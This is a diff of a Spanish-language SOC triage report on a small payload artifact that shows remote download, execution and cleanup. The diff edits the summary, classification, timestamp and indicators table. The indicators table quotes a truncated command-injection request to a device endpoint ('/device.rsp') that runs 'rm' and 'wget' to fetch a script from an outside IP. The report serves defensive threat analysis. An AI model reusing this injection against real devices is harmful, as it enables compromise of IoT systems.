@@ -4,16 +4,16 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Payload** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto de 452 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.73. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota, Ejecución, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 4 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
-- **Categoría:** `Payload`
 - **Riesgo:** `Medium`
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T20:58:10+00:00`
+- **Registrado:** `2026-08-09T20:58:10.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -53,8 +53,8 @@ POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd+%2Ftmp%3B+rm
 | --- | --- | --- |
 | ip | 143.0.0.XXX | static_analysis |
 | ip | 190.179.130.XXX | static_analysis |
-| hash | 48baa3e56c6fc5f29d035542c4fc082c3a006899c243425edd58cc2b5521e24e | static_analysis |
 | command | POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F85.239 | strings |
+| hash | 48baa3e56c6fc5f29d035542c4fc082c3a006899c243425edd58cc2b5521e24e | static_analysis |
 | ip | 85.239.151.XXX | artifact_source |
 
 ## 🔎 Triage
